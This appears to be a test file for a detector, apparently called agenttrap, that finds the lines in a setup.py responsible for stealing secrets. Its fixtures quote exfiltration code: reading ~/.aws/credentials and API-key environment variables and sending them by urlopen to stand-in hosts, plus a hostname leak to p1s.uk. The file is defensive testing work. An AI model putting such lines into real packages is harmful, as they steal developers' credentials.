from agenttrap.findings import split_culprits
from agenttrap.localizer import Culprit


def culprit(line, text):
    return Culprit("setup.py", line, text, "plaintext")


def test_key_lines_touch_the_secret_or_destination_and_the_rest_is_support():
    culprits = [
        culprit(2, "import urllib.request"),
        culprit(7, "def _build_telemetry():"),
        culprit(10, 'data = open(os.path.expanduser("~/.aws/credentials"), "rb").read()'),
        culprit(11, 'urllib.request.urlopen("http://setup-check.io/verify", data=data)'),
        culprit(13, "pass"),
    ]
    key, support = split_culprits(culprits, "~/.aws/credentials", "http://setup-check.io/verify")
    assert [c.line for c in key] == [10, 11]
    assert [c.line for c in support] == [7]  # the import and `pass` are plain scaffolding


def test_without_a_marker_every_culprit_is_a_key_line():
    culprits = [culprit(1, "a"), culprit(2, "b")]
    key, support = split_culprits(culprits, "~/.ssh/id_rsa", "http://x.test/")
    assert key == culprits
    assert support == []


def test_a_leaked_hostname_points_at_the_code_that_reads_it_not_at_scaffolding():
    from agenttrap.localizer import Culprit

    lines = [
        "import os",
        "def _callback():",
        "    try:",
        "        h = socket.gethostname()",
        '        url = "http://p1s.uk/x?h={h}".format(h=h)',
        "    except Exception:",
        "        pass",
    ]
    culprits = [Culprit("setup.py", i + 1, text, "plaintext") for i, text in enumerate(lines)]
    key, support = split_culprits(culprits, "$HOSTNAME", "http://p1s.uk/x?h=build-1")
    assert [c.line for c in key] == [4, 5]
    assert [c.line for c in support] == [2]  # the function header stays; imports, try, pass go


def test_the_line_that_sends_the_request_is_a_key_line_even_without_naming_anything():
    culprits = [
        culprit(12, 'path = os.path.expanduser("~/.aws/credentials")'),
        culprit(20, '"http://collector.agenttrap.invalid/v1/build",'),
        culprit(24, "urllib.request.urlopen(request, timeout=5)"),
        culprit(29, "_build_telemetry()"),
    ]
    key, support = split_culprits(
        culprits, "~/.aws/credentials", "http://collector.agenttrap.invalid/v1/build"
    )
    assert [c.line for c in key] == [12, 20, 24]
    assert [c.line for c in support] == [29]


def test_the_lines_that_read_the_secret_are_key_lines_too():
    culprits = [
        culprit(8, "def _build_telemetry():"),
        culprit(12, 'path = os.path.expanduser("~/.aws/credentials")'),
        culprit(15, 'info["profile"] = file.read()'),
        culprit(16, 'for name in ("OPENAI_API_KEY", "ANTHROPIC_API_KEY"):'),
        culprit(18, "info[name.lower()] = os.environ[name]"),
        culprit(20, '"http://collector.agenttrap.invalid/v1/build",'),
        culprit(24, "urllib.request.urlopen(request, timeout=5)"),
        culprit(29, "_build_telemetry()"),
    ]
    key, support = split_culprits(
        culprits, "~/.aws/credentials", "http://collector.agenttrap.invalid/v1/build"
    )
    # line 16 names the API keys, so for the AWS key it only supports the theft
    assert [c.line for c in key] == [12, 15, 18, 20, 24]
    assert [c.line for c in support] == [8, 16, 29]
